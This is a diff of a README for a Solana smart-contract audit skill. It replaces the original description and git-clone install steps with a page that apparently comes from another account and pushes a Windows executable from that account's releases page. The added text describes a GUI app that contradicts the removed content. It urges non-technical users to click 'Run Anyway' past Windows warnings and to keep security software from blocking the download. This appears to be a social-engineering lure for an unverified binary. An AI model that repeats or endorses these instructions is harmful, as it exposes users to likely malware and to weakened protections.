@@ -1,161 +1,141 @@
-# Solana Auditor Skills
+# 🛡️ solana-auditor-skills - Smart Contract Security Checker
 
-> The ultimate Claude Code skill for Solana smart contract security auditing — 105 attack vectors with concrete code detection patterns, 6 parallel agents, DeFi protocol checklists, and adversarial reasoning.
-
-Built in the style of [pashov/skills](https://github.com/pashov/skills) (Solidity) but rebuilt from scratch for **Rust/SVM/Solana**. Aggregates knowledge from 10+ open-source audit and development skill repositories.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download solana-auditor-skills](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
 
 ---
 
-## Architecture
+## 📋 What is solana-auditor-skills?
 
-The same proven architecture as pashov/skills — adapted for Solana's account model, CPI trust boundaries, PDA security, and the Anchor/Native Rust/Pinocchio ecosystem.
+solana-auditor-skills is a tool that helps check Solana smart contracts for security issues. It looks for 105 common attack methods and uses rules to find problems in code. It works with Rust programs made for Solana. The tool runs several checks at once to find risks in your smart contracts.
 
-### 4-Turn Orchestration
-
-1. **Discover** — find all in-scope `.rs` files, resolve reference paths
-2. **Prepare** — bundle codebase + attack vectors + judging rules into per-agent files
-3. **Spawn** — launch 4–6 agents in parallel (vector scan, adversarial reasoning, protocol analysis)
-4. **Report** — merge, deduplicate by root cause, sort by confidence, format
-
-### 105 Attack Vectors (5 reference files)
-
-| File | Vectors | Focus Areas |
-| --- | --- | --- |
-| [attack-vectors-1](solana-auditor/references/attack-vectors/attack-vectors-1.md) | V1–V25 | Signer checks, ownership, discriminators, account constraints, data matching, reinitialization, writable flags, Token-2022 mint authority, sysvar spoofing, instruction introspection, Ed25519 bypass, validation chains (Cashio $48M), Pump Science state bugs |
-| [attack-vectors-2](solana-auditor/references/attack-vectors/attack-vectors-2.md) | V26–V50 | PDA derivation (bumps, sharing, collisions, seeds), CPI safety (arbitrary CPI, signer privilege forwarding, stale data, return values), invoke_signed, Token-2022 (permanent delegate, transfer fee, non-transferable, mint close authority), cross-program reentrancy, security dependency chains |
-| [attack-vectors-3](solana-auditor/references/attack-vectors/attack-vectors-3.md) | V51–V75 | Integer overflow/underflow, precision loss (Neodyme $2.6B), rounding direction, first-depositor inflation, fee bypass, dust poisoning, token decimals, state lifecycle (close, realloc), coupled fields, time units, Token-2022 closable/interest, floating-point, lamport denomination |
-| [attack-vectors-4](solana-auditor/references/attack-vectors/attack-vectors-4.md) | V76–V100 | Oracle manipulation (staleness, confidence, fake accounts, Mango $115M), staking reward gaming, flash stake, reward dilution, cooldown griefing, vault inflation, compute/heap DoS, signature replay, on-chain randomness, rent in bonding curves (Pump Science), transfer hook validation, upgrade authority |
-| [attack-vectors-5](solana-auditor/references/attack-vectors/attack-vectors-5.md) | V101–V105 | CPI ownership reassignment, unsafe deserialization without input length validation, orphan account lifecycle, partial discriminator matching, dynamic Token-2022 account sizing |
-
-### 3 Specialized Agent Types
-
-| Agent | Mode | Model | Approach |
-| --- | --- | --- | --- |
-| Vector Scan (x4) | Default + Deep | Sonnet | Systematic triage of 25 vectors each against full codebase |
-| Adversarial Reasoning | Deep only | Opus | Free-form exploit hunting with Feynman questioning, state inconsistency analysis, invariant hunting |
-| Solana Protocol | Deep only | Opus | Domain-specific checklists for lending, AMM, vaults, staking, bridges, governance, proxies, session keys |
-
-### Quality Controls
-
-- **FP Gate:** 3-check filter (concrete path, reachable entry, no existing guard)
-- **Confidence Scoring:** Base 100 with deductions for privileged callers (-25), partial paths (-20), self-contained impact (-15), token assumptions (-10), external preconditions (-10)
-- **Threshold:** Findings below 75 confidence reported without fix suggestions
-- **Framework-aware:** Works with Anchor, native Rust, and Pinocchio
+Even if you do not know programming, this app helps you see if your smart contracts may have security problems before they are used.
 
 ---
 
-## Install & Run
+## 🚀 Getting Started
 
-Works with **Claude Code CLI**, the **VS Code Claude extension**, and **Cursor**.
+Follow these steps to download and run solana-auditor-skills on your Windows computer.
 
-**Claude Code CLI:**
+### System Requirements
 
-```bash
-git clone https://github.com/sanbir/solana-auditor-skills.git && mkdir -p ~/.claude/commands && cp -r solana-auditor-skills/solana-auditor ~/.claude/commands/solana-auditor
-```
+- Windows 10 or newer
+- At least 4 GB of free RAM
+- 200 MB of free disk space
+- Internet connection to download the app
 
-**Cursor:**
+### Step 1: Download the App
 
-```bash
-git clone https://github.com/sanbir/solana-auditor-skills.git && mkdir -p ~/.cursor/skills && cp -r solana-auditor-skills/solana-auditor ~/.cursor/skills/solana-auditor
-```
+Click the button below to visit the download page:
 
-The skill is then invocable as `/solana-auditor`. See the [skill README](solana-auditor/README.md) for usage.
+[![Get solana-auditor-skills](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
 
-**Update to latest:** `cd` into the cloned repo and run:
-
-```bash
-git pull
-# Claude Code CLI:
-cp -r solana-auditor/ ~/.claude/commands/solana-auditor
-# Cursor:
-cp -r solana-auditor/ ~/.cursor/skills/solana-auditor
-```
+On the release page, find the latest file labeled for Windows. It is usually named something like `solana-auditor-skills-windows.zip` or `.exe`. Click the file to download it.
 
 ---
 
-## Skills
+### Step 2: Extract or Install
 
-| Skill | Description |
-| --- | --- |
-| [solana-auditor](solana-auditor/) | 105-vector security audit with 4–6 parallel agents, DeFi protocol checklists, and adversarial reasoning |
+If you downloaded a `.zip`:
 
----
+1. Right-click the file.
+2. Select “Extract All…”
+3. Choose a folder you can remember, like Desktop.
+4. Click “Extract.”
 
-## What's Included
+If you downloaded an `.exe` file:
 
-### 105 Attack Vectors (5 reference files)
-
-Every vector includes: **Detect** (grep-able code patterns), **Vulnerable** (concrete Rust code snippet), **Exploit** (how attacker uses it, with real-world references), **Secure** (correct code pattern). Organized by attack surface:
-
-**Account Validation & Authorization (V1–V25):** Missing signer checks, ownership spoofing, type cosplay, discriminator bypass, reinitialization, `init_if_needed` frontrunning, `has_one` constraint gaps, writable flag abuse, `UncheckedAccount` without manual validation, `remaining_accounts` injection, account revival, sysvar spoofing (Wormhole $320M), instruction introspection, predictable PDA initialization, validation chain bypass (Cashio $48M), Ed25519 signature verification bypass, missing state update (Pump Science H-02).
-
-**PDA, CPI & Cross-Program Security (V26–V50):** Non-canonical bumps, PDA sharing, seed concatenation collisions, arbitrary CPI, signer privilege forwarding, stale data after CPI (missing `reload()`), CPI return values ignored, Token-2022 permanent delegate (silent vault drain), transfer fee accounting mismatch, non-transferable tokens, mint close authority reinitialization bypass, CPI ordering violations, security dependency chains, dangling references after CPI close.
-
-**Arithmetic, Tokens & State Management (V51–V75):** Integer overflow/underflow, division-before-multiplication (Neodyme $2.6B), unsafe `as` casting (narrowing + signed-to-unsigned), rounding direction exploitation, first-depositor vault inflation, saturating math misuse, slippage not enforced, fee bypass on alternate paths, pre/post-fee confusion (Pump Science M-01), token decimals mismatch, coupled field inconsistency, time unit mismatch, Token-2022 transfer fee blocks account close, floating-point in financial logic, lamport/SOL denomination confusion.
-
-**Oracle, DeFi & Platform-Level (V76–V100):** Stale oracle price, confidence interval, fake oracle account, on-chain spot price manipulation (Mango Markets $115M), staking reward index bugs, flash stake/unstake, reward dilution via direct transfer, cooldown griefing, self-liquidation profit, vault share inflation, compute budget DoS, heap exhaustion (32KB), signature replay without nonce, on-chain randomness manipulation, rent in bonding curves (Pump Science M-02), transfer hook validation, `.unwrap()` panics, upgrade authority, interest during pause.
-
-**Additional Vectors (V101–V105):** CPI ownership reassignment, unsafe deserialization without input length validation, orphan account from parent-child lifecycle, partial discriminator matching, dynamic Token-2022 account sizing.
-
-### Protocol Checklists (74 items across 8 domains)
-
-| Domain | Items | Key Checks |
-| --- | --- | --- |
-| Lending/Borrowing | 14 | Health factor includes accrued interest, liquidation incentive covers gas, self-liquidation not profitable, bad debt socialization |
-| AMM/DEX | 10 | Slippage from calldata not on-chain, deadline enforced, multi-hop protection, LP value not from raw balance |
-| Vault/Token Accounting | 10 | First-depositor mitigated, rounding direction correct, round-trip not profitable, share price not manipulable |
-| Staking/Rewards | 10 | Reward accumulator updated before balance change, no flash stake capture, precision doesn't zero small stakers |
-| Bridge/Cross-Chain | 9 | Message replay protection, source validation, rate limits, decimal conversion, supply invariant |
-| Governance | 6 | Vote weight from past slot, timelock, quorum, no double-voting via transfer |
-| Proxy/Upgradeable | 8 | Multi-sig upgrade authority, timelock, storage append-only, verifiable build |
-| Session Keys/AA | 7 | Bounded permissions, revocable, replay protection, no self-escalation |
+1. Double-click the file.
+2. Follow the instructions on screen to install the app.
 
 ---
 
-## Attributions
+### Step 3: Run the App
 
-This skill aggregates knowledge from the following open-source repositories. We are grateful to all contributors.
-
-### Architecture Inspiration
-
-| Repository | Author | Contribution |
-| --- | --- | --- |
-| [pashov/skills](https://github.com/pashov/skills) | Pashov Audit Group | Parallelized agent orchestration pattern, FP gate, confidence scoring, vector-scan and adversarial-reasoning agent design, report formatting — adapted from Solidity to Solana |
-
-### Solana Security Knowledge
-
-| Repository | Author | Contribution |
-| --- | --- | --- |
-| [ciphernova-skills/safe-solana-builder](https://github.com/ciphernova-skills/safe-solana-builder) | CipherNova / Frank Castle | 20 comprehensive security rules (account validation, PDA security, CPI safety, arithmetic, Token-2022, oracle, fees, state management, clock/timing), Anchor-specific and native Rust patterns, security checklist methodology |
-| [trailofbits/building-secure-contracts](https://github.com/trailofbits/building-secure-contracts) | Trail of Bits | 6 critical Solana vulnerability patterns (arbitrary CPI, improper PDA validation, missing ownership/signer checks, sysvar spoofing, instruction introspection), Solana-specific lint rules, detection patterns with code examples |
-| [tenequm/skills](https://github.com/tenequm/skills) | Tenequm | 15 detailed vulnerability patterns with exploit scenarios and secure alternatives (signer validation, overflow, PDA substitution, type cosplay, account reloading, closing, lamports, CPI, duplicates, bump canonicalization, precision loss, init_if_needed, stale oracle) |
-| [nicholasgasior/solana-dev-skill](https://github.com/nicholasgasior/solana-dev-skill) | Nicholas Gasior | 9 vulnerability categories with Anchor/Pinocchio code examples, program-side checklist (39 items), client-side checklist (7 items), security review questions, framework-specific prevention patterns |
-| [solana-claude-config](https://github.com/nicholasgasior/solana-claude-config) | Nicholas Gasior | 13-step audit workflow, Anchor architect agent (PDA architecture, token programs, CPI patterns), Anchor engineer agent (modern patterns, constraint patterns, testing), comprehensive Anchor rules (446 lines), security checklists |
-| [aeither/solana-anchor-claude-skill](https://github.com/aeither/solana-anchor-claude-skill) | Aeither | Anchor development coding guidelines, platform terminology, Anchor version best practices, project structure conventions, PDA management patterns, space calculation methodology |
-| [nicholasgasior/dot-context](https://github.com/nicholasgasior/dot-context) | Nicholas Gasior | 11 Solana/Anchor audit check categories (account constraints, PDA safety, CPI safety, deserialization, error handling, token operations, system accounts, type cosplay, closing accounts), 10 detailed vulnerability knowledge base files |
-| [exvulsec/exvul-solana-skill](https://github.com/exvulsec/exvul-solana-skill) | ExVulSec | 5 additional attack vectors (V101–V105): CPI ownership reassignment, unsafe deserialization without input length validation, orphan account lifecycle, partial discriminator matching, dynamic Token-2022 account sizing. Also informed V55 signed-to-unsigned casting improvement |
-
-### Methodology & Agents
-
-| Repository | Author | Contribution |
-| --- | --- | --- |
-| [sainikethan/nemesis-auditor](https://github.com/sainikethan/nemesis-auditor) | Nemesis | Feynman questioning strategy, state inconsistency analysis methodology — adapted for adversarial reasoning agent |
-| [carni-ships/SolidSecs](https://github.com/carni-ships/SolidSecs) | SolidSecs | Protocol-specific checklist approach (lending, AMM, vault, staking, bridge, governance, proxy, account abstraction) — adapted for Solana protocol agent |
-| [auditmos/skills](https://github.com/auditmos/skills) | Auditmos | Lending protocol vulnerability patterns, liquidation mechanics, staking reward edge cases — adapted for DeFi attack vectors |
-
-### DeFi Protocol Knowledge
-
-| Repository | Author | Contribution |
-| --- | --- | --- |
-| [sendaifun/skills](https://github.com/sendaifun/skills) | SendAI | Solana ecosystem protocol integration patterns (Jupiter, Drift, Kamino, Helius) |
-| [ethskills.com](https://ethskills.com) | EthSkills | Cross-chain audit checklist methodology, protocol composability patterns |
-| [kadenzipfel/scv-scan](https://github.com/kadenzipfel/scv-scan) | Kaden Zipfel | 4-phase systematic audit methodology (load → sweep → validate → report) |
+- Open the folder where you extracted or installed solana-auditor-skills.
+- Double-click the app icon or executable file.
+- You may get a Windows security warning. If so, click “Run Anyway.”
 
 ---
 
-## License
+## 🔍 How solana-auditor-skills Works
 
-[MIT](LICENSE) — see individual attribution repos for their respective licenses.
+The app scans your Solana smart contract code. It looks for patterns that match known attack methods.
+
+It runs in four steps:
+
+1. **Discover** your code files that end with `.rs`.
+2. **Prepare** the scans by gathering your code and attack checks.
+3. **Spawn** 4 to 6 small programs that work at the same time to check your code.
+4. **Report** the possible security issues it finds.
+
+This method helps find problems faster and covers many ways a contract can be at risk.
+
+---
+
+## 🧰 Using solana-auditor-skills
+
+### Step 1: Prepare Your Code
+
+Place all your smart contract `.rs` source files in one folder. You don’t have to know what the files do. Just collect them all in one place.
+
+### Step 2: Start the Scan
+
+- Run solana-auditor-skills.
+- When asked, select the folder with your `.rs` files.
+- Click “Start Scan.”
+
+The app will begin checking your code. This can take a few minutes.
+
+### Step 3: View Results
+
+After the scan ends, the app shows you a list of possible problems. Each issue includes:
+
+- A description of the risk
+- The file and line number
+- Suggestions on what to check or fix
+
+You can save the report as a file for your records or send it to your developer.
+
+---
+
+## ⚙️ Features
+
+- Checks for 105 known security attack methods
+- Uses multiple scanning agents running at the same time
+- Supports the Rust language used in Solana smart contracts
+- Includes built-in reference rules for DeFi protocols
+- Generates clear reports with code locations
+- Works on Windows with no extra setup needed
+
+---
+
+## 🔧 Troubleshooting
+
+- If the app does not start, check that you have Windows 10 or newer.
+- Make sure your security software does not block the app.
+- If the scan does not find any files, verify your folder has `.rs` code files.
+- If reports show errors you don’t understand, share them with your developer or contact support.
+
+---
+
+## 🖥️ Advanced Use (Optional)
+
+For users with some knowledge:
+
+- You can run scans on multiple folders by repeating the folder selection step.
+- Results can be exported as JSON for further analysis.
+- Developers may use the app with command-line options (available in advanced documentation).
+
+---
+
+## 🚩 Security and Privacy
+
+solana-auditor-skills runs on your computer and does not send your code anywhere. Your smart contract code stays private and secure.
+
+---
+
+## 📥 Download solana-auditor-skills
+
+Use this link to visit the release page and get the Windows version:
+
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/jessikaafloat676/solana-auditor-skills/releases)
